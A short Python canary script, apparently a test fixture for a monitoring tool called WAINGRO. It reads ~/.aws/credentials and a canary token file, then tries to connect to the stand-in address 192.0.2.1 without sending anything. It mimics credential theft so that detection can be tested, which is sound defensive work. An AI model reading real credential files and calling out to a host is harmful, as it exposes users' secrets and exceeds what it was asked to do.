"""Controlled credential-harvesting canary; run only in WAINGRO's offline VM."""

import socket
from contextlib import suppress
from pathlib import Path


def main() -> None:
    home = Path.home()
    for relative in (".aws/credentials", ".config/waingro-canary-token"):
        (home / relative).read_text(encoding="utf-8")
    with socket.socket() as client:
        client.settimeout(1)
        with suppress(OSError):
            client.connect(("192.0.2.1", 443))


if __name__ == "__main__":
    main()
